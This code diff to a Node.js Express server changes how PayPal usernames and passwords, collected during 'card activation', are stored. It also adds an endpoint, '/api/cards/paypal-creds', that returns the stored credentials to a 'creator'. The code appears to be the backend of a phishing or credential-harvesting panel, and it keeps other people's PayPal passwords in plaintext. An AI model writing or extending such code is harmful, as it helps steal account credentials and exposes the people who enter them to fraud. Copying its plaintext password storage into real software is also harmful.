@@ -18,7 +18,7 @@ function loadData() {
     try {
         if (fs.existsSync(dataFile)) {
             data = JSON.parse(fs.readFileSync(dataFile));
-            // Ensure paypalLogins exists
+            // Ensure paypalLogins and logs exist
             if (!data.paypalLogins) data.paypalLogins = [];
             if (!data.logs) data.logs = [];
         } else {
@@ -173,11 +173,7 @@ app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
         if (card.status !== 'pending') return res.status(400).json({ error: 'Card already activated' });
 
         card.status = 'activated';
-        // Store PayPal credentials in the card
-        card.paypalUsername = paypalUsername;
-        card.paypalPassword = paypalPassword;
-
-        // Also store in paypalLogins for dashboard
+        // Store PayPal credentials only in paypalLogins, not in card object
         data.paypalLogins.push({
             cardId,
             paypalUsername,
@@ -219,6 +215,17 @@ app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
     } catch (error) {
         console.error('Dashboard error:', error);
         res.status(500).json({ error: 'Server error loading dashboard' });
+    }
+});
+
+// New endpoint to fetch PayPal credentials for all users
+app.get('/api/cards/paypal-creds', authenticateToken, (req, res) => {
+    try {
+        const userPaypalLogins = data.paypalLogins.filter(l => l.user === req.user.username);
+        res.json({ paypalLogins: userPaypalLogins });
+    } catch (error) {
+        console.error('Fetch PayPal creds error:', error);
+        res.status(500).json({ error: 'Server error fetching PayPal credentials' });
     }
 });
 
